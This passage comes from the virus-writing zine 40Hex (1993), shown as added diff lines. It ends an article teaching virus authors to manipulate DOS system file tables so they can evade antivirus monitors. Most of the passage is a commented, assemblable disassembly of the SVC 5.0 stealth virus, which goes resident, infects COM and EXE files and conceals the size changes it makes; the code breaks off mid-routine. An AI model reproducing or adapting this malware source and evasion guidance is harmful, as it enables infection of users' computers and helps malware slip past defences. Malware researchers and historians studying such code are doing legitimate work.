+  location, the open mode, and the file size.  Manipulation of the system file
+  tables can often replace calls to corresponding DOS interrupt routines and
+  therefore, when combined with other techniques, reduces the effectiveness of
+  a TSR virus monitor and decreases code size.
+
+       Each open file has a corresponding system file table.  The following
+  tables come from Ralf Brown's interrupt listing.
+
+   Format of DOS 2.x system file tables:
+   Offset  Size    Description
+    00h    DWORD   pointer to next file table
+    04h    WORD    number of files in this table
+    06h  28h bytes per file
+       Offset  Size    Description
+        00h    BYTE    number of file handles referring to this file
+        01h    BYTE    file open mode (see AH=3Dh)
+        02h    BYTE    file attribute
+        03h    BYTE    drive (0 = character device, 1 = A, 2 = B, etc)
+        04h 11 BYTEs   filename in FCB format (no path, no period,
+                          blank-padded)
+        0Fh    WORD    ???
+        11h    WORD    ???
+        13h    DWORD   file size???
+        17h    WORD    file date in packed format (see AX=5700h)
+        19h    WORD    file time in packed format (see AX=5700h)
+        1Bh    BYTE    device attribute (see AX=4400h)
+       ---character device---
+        1Ch    DWORD   pointer to device driver
+       ---block device---
+        1Ch    WORD    starting cluster of file
+        1Eh    WORD    relative cluster in file of last cluster accessed
+       ------
+        20h    WORD    absolute cluster number of current cluster
+        22h    WORD    ???
+        24h    DWORD   current file position???
+
+   Format of DOS 3.x system file tables and FCB tables:
+   Offset  Size    Description
+    00h    DWORD   pointer to next file table
+    04h    WORD    number of files in this table
+    06h  35h bytes per file
+       Offset  Size    Description
+        00h    WORD    number of file handles referring to this file
+        02h    WORD    file open mode (see AH=3Dh)
+               bit 15 set if this file opened via FCB
+        04h    BYTE    file attribute
+        05h    WORD    device info word (see AX=4400h)
+        07h    DWORD   pointer to device driver header if character device
+               else pointer to DOS Drive Parameter Block (see AH=32h)
+        0Bh    WORD    starting cluster of file
+        0Dh    WORD    file time in packed format (see AX=5700h)
+        0Fh    WORD    file date in packed format (see AX=5700h)
+        11h    DWORD   file size
+        15h    DWORD   current offset in file
+        19h    WORD    relative cluster within file of last cluster accessed
+        1Bh    WORD    absolute cluster number of last cluster accessed
+               0000h if file never read or written???
+        1Dh    WORD    number of sector containing directory entry
+        1Fh    BYTE    number of dir entry within sector (byte offset/32)
+        20h 11 BYTEs   filename in FCB format (no path/period, blank-padded)
+        2Bh    DWORD   (SHARE.EXE) pointer to previous SFT sharing same file
+        2Fh    WORD    (SHARE.EXE) network machine number which opened file
+        31h    WORD    PSP segment of file's owner (see AH=26h)
+        33h    WORD    offset within SHARE.EXE code segment of
+               sharing record (see below)  0000h = none
+
+   Format of DOS 4+ system file tables and FCB tables:
+   Offset  Size    Description
+    00h    DWORD   pointer to next file table
+    04h    WORD    number of files in this table
+    06h  3Bh bytes per file
+       Offset  Size    Description
+        00h    WORD    number of file handles referring to this file
+        02h    WORD    file open mode (see AH=3Dh)
+               bit 15 set if this file opened via FCB
+        04h    BYTE    file attribute
+        05h    WORD    device info word (see AX=4400h)
+               bit 15 set if remote file
+               bit 14 set means do not set file date/time on closing
+        07h    DWORD   pointer to device driver header if character device
+               else pointer to DOS Drive Parameter Block (see AH=32h)
+               or REDIR data
+        0Bh    WORD    starting cluster of file
+        0Dh    WORD    file time in packed format (see AX=5700h)
+        0Fh    WORD    file date in packed format (see AX=5700h)
+        11h    DWORD   file size
+        15h    DWORD   current offset in file
+       ---local file---
+        19h    WORD    relative cluster within file of last cluster accessed
+        1Bh    DWORD   number of sector containing directory entry
+        1Fh    BYTE    number of dir entry within sector (byte offset/32)
+       ---network redirector---
+        19h    DWORD   pointer to REDIRIFS record
+        1Dh  3 BYTEs   ???
+       ------
+        20h 11 BYTEs   filename in FCB format (no path/period, blank-padded)
+        2Bh    DWORD   (SHARE.EXE) pointer to previous SFT sharing same file
+        2Fh    WORD    (SHARE.EXE) network machine number which opened file
+        31h    WORD    PSP segment of file's owner (see AH=26h)
+        33h    WORD    offset within SHARE.EXE code segment of
+               sharing record (see below)  0000h = none
+        35h    WORD    (local) absolute cluster number of last clustr
+                 accessed (redirector) ???
+        37h    DWORD   pointer to IFS driver for file, 0000000h if native DOS
+
+       In order to exploit this nifty structure in DOS, the virus must first
+  find the location of the appropriate system file table.  This may be easily
+  accomplished with a few undocumented DOS calls.  Given the file handle in
+  bx, the following code will return the address of the corresponding system
+  file table:
+
+       mov  ax,1220h  ; Get job file table entry to ES:DI
+       int  2fh       ; DOS 3+ only
+
+       mov  bl,es:di  ; get number of the SFT for the file handle
+                      ; -1 = handle not open
+       mov  ax,1216h  ; get address of the system file table
+       int  2fh       ; entry number bx
+       ; ES:DI now points to the system file table entry
+
+       Now that the system file table entry address is known, it is a trivial
+  matter to alter the various bytes of the entry to fit your particular needs.
+  Most viruses must first clear a file's attributes in order to open the file
+  in read/write mode, since it would otherwise not be able to write to a read-
+  only file.  This handicap is easily overcome by opening the file in read-
+  only mode (al = 0) and changing the byte (or word) referring to the file's
+  open mode to 2.  This has the added benefit of bypassing some resident
+  alarms, which generally do not go off if a file is opened in read only mode.
+  It is also possible to set a file's pointer by altering the double word at
+  offset 15h (in DOS 3+).  So a quick and easy way to reset the file pointer
+  is:
+       mov  es:di+15h,0
+       mov  es:di+17h,0
+
+       It is acceptable to ignore the DOS 2.X system file table format.  DOS
+  2.X is not in common use today and many programs simply refuse to run under
+  such primitive versions.  Most of the useful offsets are constant in DOS
+  3.X+, which simplifies the code tremendously.
+
+       This is only a surface treatment of a topic which warrants further
+  investigation.  Numerous opportunities exist for the enterprising virus
+  author to exploit the power of the system file tables.  But the only way to
+  find these opportunities is to experiment.  Have fun!
+
+40Hex Issue 11 Volume 3 Number 2                                      File 007
+
+                                   SVC 5.0
+
+     SVC 5.0 is a good example of a true stealth virus.  Cheesy, primitive
+stealth-wanna-be viruses "disinfect" by rewriting the files on the disk.
+Not so with SVC 5.0 and all real stealth viruses, which alter only the memory
+image of the file, leaving the original intact.  This has advantages,
+including:
+        o Time savings
+        o Fewer disk accesses
+        o No additional disk writes are required
+
+General Notes:
+      SVC 5.0 is a parasitic, resident COM and EXE infector.  It does not
+have encryption, but this is offset by the true stealth capabilities of the
+virus.  Although it hides the file length increase, the virus does not suffer
+from the dreaded CHKDSK crosslinking errors experienced by many early stealth
+viruses.  However, the code to overcome this problem is kludgily implemented;
+the virus detects execution of programs with the "HK" and "DS" strings in the
+filename.  Although this helps with CHKDSK, it won't help with other programs
+which work in CHKDSK's asinine fashion.
+
+                                                -- Dark Angel
+                                                   Phalcon/Skism 1993
+-------------------------------------------------------------------------------
+                .model  tiny
+                .code
+; SVC 5-A
+; Disassembly done by Dark Angel of Phalcon/Skism
+; Assemble with Tasm /m SVC5-A
+                org     0
+
+start:
+                call    next
+next:
+                pop     si
+                db      83h,0EEh,3              ; sub si,offset next
+                mov     word ptr cs:[si+offset storeAX],ax
+                push    es
+                push    si
+                xor     dx,dx
+                mov     ah,84h                  ; installation check
+                int     21h
+                pop     si
+                push    si
+                cmp     dx,1990h
+                jne     installvirus
+                cmp     bh,byte ptr cs:[si+versionbyte]
+                ja      go_exitvirus
+                jc      installvirus
+                push    si
+                push    es
+                xchg    ah,al                   ; convert ax to virus
+                xor     ax,0FFFFh               ; CS
+                mov     es,ax                   ; es->resident virus
+                push    cs
+                pop     ds
+                xor     di,di
+                mov     cx,begindata - start - 1; same version?
+                cld
+                repe    cmpsb
+                pop     es
+                pop     si
+                jz      go_exitvirus            ; yes, exit
+                jmp     reboot                  ; else reboot
+go_exitvirus:
+                jmp     exitvirus
+installvirus:
+                push    es
+                xor     ax,ax
+                mov     ds,ax
+                les     ax,dword ptr ds:21h*4   ; save old int 21h
+                mov     cs:[si+oldint21],ax     ; handler
+                mov     word ptr cs:[si+oldint21+2],es
+                les     ax,dword ptr ds:8*4     ; save old int 8 handler
+                mov     cs:[si+oldint8],ax
+                mov     word ptr cs:[si+oldint8+2],es
+                pop     es
+                mov     cs:[si+carrierPSP],es   ; save current PSP
+                mov     ah,49h                  ; Release memory @ PSP
+                int     21h
+                jc      exitvirus               ; exit on error
+
+                mov     ah,48h                  ; Find total memory size
+                mov     bx,0FFFFh
+                int     21h
+                sub     bx,(viruslength+15)/16+1; shrink allocation for carrier
+                jc      exitvirus
+
+                mov     cx,es                   ; compute new memory
+                stc                             ; block location
+                adc     cx,bx
+                mov     ah,4Ah                  ; Allocate memory for carrier
+                int     21h
+
+                mov     bx,(viruslength+15)/16
+                stc
+                sbb     es:[2],bx               ; fix high memory field in PSP
+                mov     es,cx
+                mov     ah,4Ah                  ; Allocate memory for virus
+                int     21h
+
+                mov     ax,es                   ; Go to virus MCB
+                dec     ax
+                mov     ds,ax
+                mov     word ptr ds:[1],8       ; mark owner = DOS
+                mov     ax,cs:[si+carrierPSP]   ; go back to carrier PSP
+                dec     ax                      ; go to its MCB
+                mov     ds,ax
+                mov     byte ptr ds:[0],'Z'     ; mark it end of block
+                push    cs
+                pop     ds
+                xor     di,di                   ; copy virus to high memory
+                mov     cx,viruslength + 1
+                cld
+                rep     movsb
+                xor     ax,ax
+                mov     ds,ax
+                cli                             ; and set up virus
+                mov     word ptr ds:21h*4,offset int21
+                mov     word ptr ds:21h*4+2,es  ; interrupt handlers
+                mov     word ptr ds:8*4,offset int8
+                mov     word ptr ds:8*4+2,es
+exitvirus:
+                sti
+                push    cs
+                pop     ds
+                pop     si
+                push    si
+                mov     ah,byte ptr cs:[si+offset encryptval1]
+                mov     dh,byte ptr cs:[si+offset encryptval2]
+                add     si,offset savebuffer
+                call    decrypt
+                pop     si
+                pop     es
+                cld
+                cmp     cs:[si+offset savebuffer],'ZM'
+                je      returnEXE
+                mov     di,100h
+                push    cs
+                pop     ds
+                push    cs
+                pop     es
+                push    si
+                add     si,offset savebuffer
+                movsb
+                movsw
+                pop     si
+                mov     ax,100h
+                push    ax
+                mov     ax,word ptr cs:[si+offset storeAX]
+                retn
+returnEXE:
+                mov     bx,es
+                add     bx,10h
+                add     bx,cs:[si+savebuffer+16h]
+                mov     word ptr cs:[si+jmpcs],bx
+                mov     bx,cs:[si+savebuffer+14h]
+                mov     word ptr cs:[si+jmpip],bx
+                mov     bx,es
+                mov     ds,bx
+                add     bx,10h
+                add     bx,cs:[si+savebuffer+0eh]
+                cli
+                mov     ss,bx
+                mov     sp,cs:[si+savebuffer+10h]
+                sti
+                mov     ax,word ptr cs:[si+offset storeAX]
+                db      0EAh                    ; jmp far ptr
+jmpip           dw      0
+jmpcs           dw      0
+
+int21:
+                pushf
+                push    ax
+                push    bx
+                push    cx
+                push    dx
+                push    si
+                push    di
+                push    ds
+                push    es
+                mov     word ptr cs:int21command,ax
+                cmp     word ptr cs:int21command,4B03h ; load/no PSP
+                je      _load_noexecute
+                cmp     word ptr cs:int21command,4B01h ; load/no execute
+                je      _load_noexecute
+                cmp     word ptr cs:int21command,4B00h ; load/execute
+                je      _load_execute
+                cmp     ah,3Dh                  ; handle open
+                je      _handleopen
+                cmp     ah,3Eh                  ; handle close
+                je      _handleclose
+                cmp     ah,40h                  ; handle write
+                je      _handlewrite
+                cmp     ah,4Ch                  ; terminate
+                je      _terminate
+                jmp     short exitint21
+                nop
+_terminate:
+                jmp     terminate
+_handlewrite:
+                jmp     handlewrite
+_load_noexecute:
+                jmp     load_noexecute
+_handleclose:
+                jmp     handleclose
+_handlecreate:
+                jmp     handlecreate
+_load_execute:
+                jmp     load_execute
+_handleopen:
+                jmp     handleopen
+_FCBfindfirstnext:
+                jmp     FCBfindfirstnext
+_ASCIIfindfirstnext:
+                jmp     ASCIIfindfirstnext
+_handlegoEOF:
+                jmp     handlegoEOF
+_handleopen2:
+                jmp     handleopen2
+_handleread:
+                jmp     handleread
+_getsetfiletime:
+                jmp     getsetfiletime
+
+return:
+                retn
+
+load_execute_exit:
+                call    restoreint24and23
+                jmp     short exitint21
+                nop
+
+restoreint24and23:
+                xor     ax,ax
+                mov     ds,ax
+                mov     ax,cs:oldint24
+                mov     ds:24h*4,ax
+                mov     ax,cs:oldint24+2
+                mov     word ptr ds:24h*4+2,ax
+                mov     ax,cs:oldint23
+                mov     ds:23h*4,ax
+                mov     ax,cs:oldint23+2
+                mov     word ptr ds:23h*4+2,ax
+                retn
+
+exitint21:
+                pop     es
+                pop     ds
+                pop     di
+                pop     si
+                pop     dx
+                pop     cx
+                pop     bx
+                pop     ax
+                cmp     ah,3Ch                  ; handlecreate
+                je      _handlecreate
+                cmp     ah,83h                  ; installation check for
+                je      old_installation_check  ; other versions of SVC
+                cmp     ah,84h                  ; installation check for
+                je      installation_check      ; this version of SVC
+                cmp     ah,4Eh                  ; find first?
+                je      _ASCIIfindfirstnext
+                cmp     ah,4Fh                  ; find next?
+                je      _ASCIIfindfirstnext
+                cmp     ah,11h                  ; find first
+                je      _FCBfindfirstnext
+                cmp     ah,12h                  ; find next
+                je      _FCBfindfirstnext
+                cmp     ax,4202h                ; go EOF
+                je      _handlegoEOF
+                cmp     ah,3Dh                  ; handle open
+                je      _handleopen2
+                cmp     ah,3Fh                  ; handle read
+                je      _handleread
+                cmp     ah,57h                  ; get/set file time
+                je      _getsetfiletime
+                popf                            ; chain to original int
+                jmp     dword ptr cs:oldint21   ; 21h handler
+
+callint21:
+                cli
+                pushf
+                call    dword ptr cs:oldint21
+                retn
+
+installation_check:
+                popf
+                mov     bh,cs:versionbyte
+                mov     ax,cs
+                xor     ax,0FFFFh
+                xchg    ah,al
+common_installation_check_return:
+                mov     dx,1990h
+                iret
+
+old_installation_check:
+                popf
+                jmp     short common_installation_check_return
+
+popdsdx_return:
+                pop     dx
+                pop     ds
+                jmp     return
+
+load_execute:
+                call    check_chkdsk
+                call    infectdsdx
+                jmp     load_execute_exit
+
+infectdsdx:
+                call    setint24and23
+                jmp     short infectdsdx_continue
+                nop
+
+setint24and23:
+                xor     ax,ax
+                mov     es,ax
+                les     ax,dword ptr es:24h*4
+                mov     cs:oldint24,ax
+                mov     cs:oldint24+2,es
+                xor     ax,ax
+                mov     es,ax
+                les     ax,dword ptr es:23h*4
+                mov     cs:oldint23,ax
+                mov     cs:oldint23+2,es
+                xor     ax,ax
+                mov     es,ax
+                mov     word ptr es:24h*4,offset int24
+                mov     word ptr es:24h*4+2,cs
+                mov     word ptr es:23h*4,offset int23
+                mov     word ptr es:23h*4+2,cs
+                retn
+
+infectdsdx_continue:
+                push    ds
+                push    dx
+                cmp     byte ptr cs:tickcount,3Ch ; don't infect too early
+                jb      popdsdx_return          ; after previous one
+                mov     ax,4300h                ; get file attributes
+                call    callint21
+                jc      popdsdx_return
+                mov     cs:fileattr,cx
+                and     cl,0FEh                 ; turn off r/o bit
+                mov     ax,4301h                ; and reset file attributes
+                call    callint21
+                jc      popdsdx_return
+                mov     cx,cs:fileattr
+                and     cl,4                    ; test cl,4
+                cmp     cl,4                    ; check system attribute
+                je      infecthandle_exit       ; exit if set
+                mov     ax,3D02h                ; open file read/write
+                call    callint21
+                jc      infecthandle_exit
+                mov     bx,ax                   ; handle to bx
+                push    dx                      ; save file name pointer
+                mov     ax,5700h                ; get file time/date
+                call    callint21
+                pop     dx
+                and     cx,1Eh                  ; check if seconds = 60
+                cmp     cx,1Eh                  ; (infection marker)
+                jne     infect_dsdx_checkmo     ; continue if not so marked
+                jmp     short infecthandle_alreadyinfected
+                nop
+infect_dsdx_checkmo:
+                call    check_command_com
+                jnc     infecthandle
+                jmp     short infecthandle_alreadyinfected
+                nop
+
+check_command_com:
+                cld
+                mov     si,dx
+check_command_com_loop:
+                lodsw
+                cmp     ax,'MM'                 ; COMMAND.COM?
+                je      check_command_com_yes
+                cmp     ax,'mm'
+                je      check_command_com_yes
+                cmp     ax,'MB'                 ; IBMBIO/IBMDOS?
+                je      check_command_com_yes
+                cmp     ax,'mb'
+                je      check_command_com_yes
+                cmp     ah,0
+                je      check_command_com_no
+                dec     si
+                jmp     short check_command_com_loop
+check_command_com_yes:
+                stc
+                retn
+check_command_com_no:
+                clc
+                retn
+
+infecthandle_exit:
+                jmp     popdsdx_return
+infecthandle:
+                cmp     bx,5                    ; check if handle too
+                jb      infecthandle_exit       ; small (predefined)
+                call    checkifinfected
+                jnc     infecthandle_alreadyinfected
+                call    infect_handle
+infecthandle_alreadyinfected:
+                mov     ah,3Eh                  ; Close file
+                call    callint21
+                pop     dx
+                pop     ds
+                jc      infecthandle_exit2
+                mov     ax,4301h                ; restore file attributes
+                mov     cx,cs:fileattr
+                call    callint21
+infecthandle_exit2:
+                jmp     return
+
+infect_handle_exit:
+                jmp     infect_handle_error
+infect_handle:
+                mov     ax,5700h                ; get file time/date
+                call    callint21
+                mov     cs:filetime,cx
+                mov     cs:filedate,dx
+                xor     cx,cx
+                xor     dx,dx
+                mov     ax,4200h                ; go to start of file
+                call    callint21
+                push    cs
+                pop     ds
+                mov     cx,18h                  ; read header
+                mov     dx,offset savebuffer
+                mov     ah,3Fh
+                call    callint21
+                jc      infect_handle_exit
+                push    cs
+                pop     es
+                push    cs
+                pop     ds
+                mov     si,offset savebuffer    ; copy to work buffer
+                mov     di,offset workbuffer
+                mov     cx,18h
+                cld
+                rep     movsb
+                mov     ax,2C00h
+                call    callint21
+                mov     byte ptr cs:encryptval2,dh
+                mov     byte ptr cs:encryptval1,dl
+                mov     ah,dl
+                mov     si,offset savebuffer
+                call    decrypt
+                cmp     cs:workbuffer,'ZM'      ; check if EXE
+                je      infect_handle_EXE
+                mov     cs:workbuffer,0E9h      ; encode the jmp
+                xor     cx,cx
+                xor     dx,dx
+                mov     ax,4202h                ; get file size
+                call    callint21
+                cmp     dx,0
+                jne     infect_handle_exit
+                cmp     ax,viruslength
+                jb      infect_handle_exit
+                cmp     ax,0EDE1h               ; check if too large
+                jae     infect_handle_exit
+                sub     ax,3                    ; adjust size to jmp location
+                mov     word ptr cs:workbuffer+1,ax
+                call    writevirusandheader     ; write virus to file
+                jmp     infect_handle_finish
+
+writevirusandheader:
+                push    cs
+                pop     ds
+                xor     dx,dx
+                mov     cx,viruslength
+                mov     ah,40h                  ; concatenate virus
+                call    callint21
+                jc      writevirusandheader_exit
+                cmp     ax,viruslength
+                jne     writevirusandheader_exit
+                xor     cx,cx
+                xor     dx,dx
+                mov     ax,4200h                ; go to start of file
+                call    callint21
+                jc      writevirusandheader_exit
+                mov     dx,offset workbuffer    ; write new header to file
+                mov     ah,40h
+                mov     cx,18h
+                call    callint21
+                retn
+writevirusandheader_exit:
+                stc
+                retn
+
+infect_handle_EXE:
+                xor     cx,cx                   ; go to end of file
+                xor     dx,dx
+                mov     ax,4202h
+                call    callint21
+                push    dx                      ; save file size
+                push    ax
+                mov     si,ax
+                xor     ax,ax
+                xchg    ax,dx
+                mov     di,1000h
+                mul     di
+                mov     dx,ax
+                mov     ax,si
+                mov     si,dx
+                xor     dx,dx
+                mov     di,10h                  ; convert to paragraphs
+                div     di
+                add     ax,si
+                xchg    ax,dx
+                sub     dx,cs:workbuffer+8      ; subtract header size
+                mov     word ptr cs:workbuffer+16h,dx ; insert new initial
+                mov     word ptr cs:workbuffer+14h,ax ; CS:IP (end of file)
+                pop     ax
+                pop     dx
+                add     ax,viruslength          ; calculate new image
+                adc     dx,0                    ; size mod 512 and div 512
+                mov     di,200h
+                div     di
+                cmp     dx,0
+                je      infect_handle_EXE_nofixup
+                add     ax,1                    ; pagelength fixup
+infect_handle_EXE_nofixup:
+                mov     cs:workbuffer+4,ax
+                mov     cs:workbuffer+2,dx
+                mov     ds,word ptr cs:workbuffer+16h ; insert new SS:SP
+                mov     word ptr cs:workbuffer+0Eh,ds
+                mov     ax,word ptr cs:workbuffer+14h
+                add     ax,17D7h
+                mov     word ptr cs:workbuffer+10h,ax
+                call    writevirusandheader     ; write virus to file
+                jmp     short infect_handle_finish
+                nop
+infect_handle_error:
+                stc
+infect_handle_finish:
+                mov     ax,5701h                ; restore file time/date
+                mov     cx,cs:filetime
+                mov     dx,cs:filedate
+                jc      infect_handle_noreset
+                and     cx,0FFFEh               ; but set seconds to
+                or      cx,1Eh                  ; 60
+                mov     byte ptr cs:tickcount,0 ; reset tickcount
+infect_handle_noreset:
+                call    callint21
+                retn
+
+int23:
+                iret
+int24:
+                mov     al,3
+                iret
+
+load_noexecute_exit:
+                jmp     load_noexecute_closeexit
+load_noexecute:
+                call    setint24and23
+                push    ds
+                push    dx
+                mov     ax,4300h                ; get file attributes
+                call    callint21
+                jc      load_noexecute_exit
+                mov     cs:fileattr,cx
+                and     cl,0FEh                 ; turn off r/o bit
+                mov     ax,4301h                ; reset attributes
+                call    callint21
+                jc      load_noexecute_exit
+                mov     ax,3D02h                ; open file read/write
+                call    callint21
+                jc      load_noexecute_exit
+                mov     bx,ax                   ; handle to bx
+                call    checkifinfected
+                jc      load_noexecute_exit
+                jmp     short load_noexecute_disinfect
+                nop
+checkifinfected_exit:
+                stc                             ; mark infected
+                retn                            ; and exit
+
+checkifinfected:
+                mov     ax,5700h                ; get file time/date
+                call    callint21
+                mov     cs:filedate,dx
+                mov     cs:filetime,cx
+                and     cx,1Fh
+                cmp     cx,1Eh
+                jne     checkifinfected_exit
+                xor     cx,cx
+                xor     dx,dx
+                mov     ax,4202h                ; go to end of file
+                call    callint21
+                jc      checkifinfected_exit
+                mov     cs:filesizelo,ax        ; save filesize
+                mov     cs:filesizehi,dx
+                sub     ax,endvirus - infection_marker
+                sbb     dx,0
+                mov     cx,ax
+                xchg    cx,dx
+                mov     ax,4200h                ; rewind to infection
+                call    callint21               ; marker
+                jc      checkifinfected_exit
+                push    cs
+                pop     ds
+                mov     ah,3Fh                  ; read file
+                mov     cx,3
+                mov     dx,offset savebuffer
+                call    callint21
+                jc      checkifinfected_exit
+                push    cs
+                pop     es
+                mov     si,offset savebuffer    ; check for infection
+                mov     di,offset infection_marker
+                mov     cx,3                    ; marker
+                repne   cmpsb
+                jnz     checkifinfected_exit
+                clc                             ; mark not infected
+                retn                            ; and exit
+
+load_noexecute_disinfect:
+                call    disinfect
+                jmp     load_noexecute_closeexit
+
+disinfect_exit:
+                jmp     disinfect_error
+disinfect:
+                mov     dx,cs:filesizelo
+                mov     cx,cs:filesizehi
+                sub     dx,75h                  ; go to savebuffer
+                nop
+                sbb     cx,0
+                mov     ax,4200h
+                call    callint21
+                jc      disinfect_exit
+                jmp     short disinfect_file
+                nop
+
+                jmp     load_noexecute_closeexit
+disinfect_file:
+                push    cs
+                pop     ds
+                mov     ah,3Fh                  ; Read carrier's
+                mov     cx,18h                  ; original header
+                mov     dx,offset savebuffer
+                push    cs
+                pop     ds
+                call    callint21
+                jc      disinfect_exit
+                mov     dx,cs:filesizelo        ; go to decryption
+                mov     cx,cs:filesizehi        ; values
+                sub     dx,endvirus - encryptval1
+                nop
+                sbb     cx,0
+                mov     ax,4200h
+                call    callint21
+                mov     dx,offset encryptval1
+                mov     ah,3Fh                  ; read decryption values
+                mov     cx,2
+                call    callint21
+                mov     si,offset savebuffer
+                mov     ah,byte ptr cs:encryptval1
+                mov     dh,byte ptr cs:encryptval2
+                call    decrypt                 ; decrypt old header
+                xor     cx,cx
+                xor     dx,dx
+                mov     ax,4200h
+                call    callint21
+                jc      disinfect_error
+                mov     ah,40h                  ; Write old header to
+                mov     cx,18h                  ; file
+                mov     dx,offset savebuffer
+                call    callint21
+                jc      disinfect_error
+                mov     dx,cs:filesizelo
+                mov     cx,cs:filesizehi
+                sub     dx,viruslength
+                sbb     cx,0                    ; go to end of carrier
+                mov     ax,4200h                ; file and
+                call    callint21
+                jc      disinfect_error
+                mov     ah,40h                  ; truncate file
+                xor     cx,cx                   ; at current position
+                call    callint21
+                jc      disinfect_error
+                mov     ax,5701h                ; restore file time/date
+                mov     dx,cs:filedate
+                mov     cx,cs:filetime
+                xor     cx,1Fh
+                call    callint21
+                retn
+disinfect_error:
+                stc                             ; mark error
+                retn
+
+load_noexecute_closeexit:
+                mov     ah,3Eh                  ; Close file and
+                call    callint21
+                mov     ax,4301h                ; restore attributes
+                mov     cx,offset fileattr      ; BUG!!!
+                pop     dx
+                pop     ds
+                call    callint21
+                call    restoreint24and23
+                jmp     exitint21
+
+FCBfindfirstnext:
+                call    dword ptr cs:oldint21   ; prechain
+                pushf
+                pop     cs:returnFlags
+                cmp     al,0FFh
+                je      FCBfindfirstnext_exit
+                cmp     cs:chkdskflag,0
+                jne     FCBfindfirstnext_exit
+                push    ax
+                push    bx
+                push    cx
+                push    dx
+                push    es
+                push    ds
+                mov     ah,2Fh                  ; Get DTA
+                call    callint21
+                cmp     word ptr es:[bx],0FFh   ; extended FCB?
+                jne     FCBfindfirstnext_noextendedFCB
+                add     bx,8                    ; convert if so
+FCBfindfirstnext_noextendedFCB:
+                mov     ax,es:[bx+16h]
+                and     ax,1Fh                  ; check if seconds = 60
+                cmp     ax,1Eh
+                jne     FCBfindfirstnext_notinfected
+                xor     word ptr es:[bx+16h],1Fh; fix seconds field
+                sub     word ptr es:[bx+1Ch],viruslength
+                sbb     word ptr es:[bx+1Eh],0  ; shrink size
+FCBfindfirstnext_notinfected:
+                pop     ds
+                pop     es
+                pop     dx
+                pop     cx
+                pop     bx
+                pop     ax
+FCBfindfirstnext_exit:
+                pop     cs:storesIP
+                pop     cs:storesCS
+                popf
+                push    cs:returnFlags
+                push    cs:storesCS
+                push    cs:storesIP
+                iret
+
+ASCIIfindfirstnext:
+                call    dword ptr cs:oldint21   ; prechain
+                pushf
+                pop     cs:returnFlags
+                jc      ASCIIfindfirstnext_exit
+                cmp     cs:chkdskflag,0
+                jne     ASCIIfindfirstnext_exit
+                push    ax
+                push    bx
+                push    cx
+                push    dx
+                push    es
+                push    ds
+                mov     ah,2Fh                  ; Get DTA
+                call    callint21
+                mov     ax,es:[bx+16h]          ; get file time
+                and     ax,1Fh                  ; to check if file
+                cmp     ax,1Eh                  ; infected
+                jne     ASCIIfindfirstnext_notinfected
+                xor     word ptr es:[bx+16h],1Fh        ; hide time change
+                sub     word ptr es:[bx+1Ah],viruslength; and file length
+                sbb     word ptr es:[bx+1Ch],0          ; change
+ASCIIfindfirstnext_notinfected:
+                pop     ds
+                pop     es
+                pop     dx
+                pop     cx
+                pop     bx
+                pop     ax
+ASCIIfindfirstnext_exit:
+                pop     cs:storesIP
+                pop     cs:storesCS
+                popf
+                push    cs:returnFlags
+                push    cs:storesCS
+                push    cs:storesIP
+                iret
+handleopen:
+                call    check_infectok
+                jnc     handleopen_continue
+                jmp     exitint21
+
+check_infectok:
+                cld
+                mov     si,dx
+                lodsw
+                cmp     ah,':'
+                jne     check_infectok_nodrive
+                cmp     al,'a'                  ; make sure not floppy
+                je      check_infectok_exit
+                cmp     al,'A'
+                je      check_infectok_exit
+                cmp     al,'B'
+                jb      check_infectok_exit     ; BUG
+                cmp     al,'b'
+                je      check_infectok_exit
+                jmp     short check_extension
+                nop
+check_infectok_exit:
+                jmp     short check_extension_notok
+                nop
+check_infectok_nodrive:
+                mov     ah,19h                  ; get default drive
+                call    callint21
+                cmp     al,2                    ; make sure not floppy
+                jae     check_extension
+                jmp     short check_extension_notok
+                db      90h
+
+check_extension:
+                cld
+                mov     si,dx
+check_extension_findextension:
+                lodsb
+                cmp     al,'.'
+                je      check_extension_foundextension
+                cmp     al,0
+                jne     check_extension_findextension
+                jmp     short check_extension_notok
+                db      90h
+check_extension_foundextension:
+                lodsw
+                cmp     ax,'OC'
+                je      check_extension_checkcom
+                cmp     ax,'oc'
+                je      check_extension_checkcom
+                cmp     ax,'XE'
+                je      check_extension_checkexe
+                cmp     ax,'xe'
+                je      check_extension_checkexe
+                jmp     short check_extension_notok
+                db      90h
+check_extension_checkcom:
+                lodsb
+                cmp     al,'M'
+                je      check_extension_ok
+                cmp     al,'m'
+                je      check_extension_ok
+                jmp     short check_extension_notok
+                db      90h
+check_extension_checkexe:
+                lodsb
+                cmp     al,'E'
+                je      check_extension_ok
+                cmp     al,'e'
+                je      check_extension_ok
+                jmp     short check_extension_notok
+                db      90h
+check_extension_ok:
+                clc
+                retn
+check_extension_notok:
+                stc
+                retn
+
+handleopen_continue:
+                call    infectdsdx
+                call    restoreint24and23
+                jmp     exitint21
+handlecreate:
+                mov     word ptr cs:storess,ss  ; preserve ss and sp
+                mov     word ptr cs:storesp,sp
+                call    dword ptr cs:oldint21
+                cli
+                mov     ss,word ptr cs:storess
+                mov     sp,word ptr cs:storesp
+                sti
+                pop     cs:returnFlags          ; save return flags
+                pushf
+                push    ax
+                push    bx
+                push    cx
+                push    ds
+                push    es
+                push    si
+                push    di
+                jc      handlecreate_exit
+                push    dx
+                push    ax
+                call    check_extension
+                pop     ax
+                pop     dx
+                jc      handlecreate_exit
+                push    ax
+                call    check_command_com
+                pop     ax
+                jc      handlecreate_exit
+                mov     cs:handletoinfect,ax    ; save handle to infect
+                                                ; upon close
+handlecreate_exit:
+                pop     di
+                pop     si
+                pop     es
+                pop     ds
+                pop     cx
+                pop     bx
+                pop     ax
+                jmp     exit_replaceflags
+handleclose_exit:
+                mov     cs:filehand,0
+                jmp     exitint21
+
+handleclose:
+                cmp     bx,0
+                jne     handleclose_continue
+                jmp     exitint21
+handleclose_continue:
+                cmp     bx,cs:handletoinfect
+                je      handleclose_infect
+                cmp     bx,cs:filehand
+                je      handleclose_exit
+                jmp     exitint21
+handleclose_infect:
+                mov     ah,45h                  ; Duplicate file handle
+                call    callint21
+                jc      handleclose_infect_exit
+                xchg    ax,bx
+                call    setint24and23
+                call    handleclose_infecthandle
+                call    restoreint24and23
+handleclose_infect_exit:
+                mov     cs:handletoinfect,0
+                jmp     exitint21
+
+handleclose_infecthandle:
+                push    ds
+                push    dx
+                jmp     infecthandle
+
+int8:
+                push    ax
+                push    ds
+                pushf
+                cmp     byte ptr cs:tickcount,0FFh ; don't "flip" tickcount
+                je      int8checkint1
+                inc     cs:tickcount            ; one mo tick
+int8checkint1:
+                xor     ax,ax
+                mov     ds,ax
